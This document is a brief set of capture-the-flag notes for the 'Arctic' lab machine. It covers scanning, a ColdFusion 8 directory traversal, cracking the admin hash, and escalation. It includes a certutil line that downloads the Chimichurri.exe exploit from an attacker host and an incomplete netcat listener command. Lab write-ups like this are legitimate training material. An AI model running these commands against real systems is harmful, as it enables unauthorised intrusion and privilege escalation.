# Arctic
- nmap scan shows us that 135, 8500, 49154 are open
- luckily if we browse to the port 8500, we see a directory listing with some interesting stuff
- clicking the cfide we see the adminstrator panel and we now know what to exploit
- on the admin panel we see that it is coldfusion 8
- we can use searchsploit to find a exploit for a directory traversal
- we can use this to get into the admin user with the hashed password which comes out to happyday in crackstation
- however we need get the file uploaded to the server first
- certutil.exe -urlcache -split -f http://10.10.14.41/Chimichurri.exe Chimichurri.exe
- nc -nlvvp
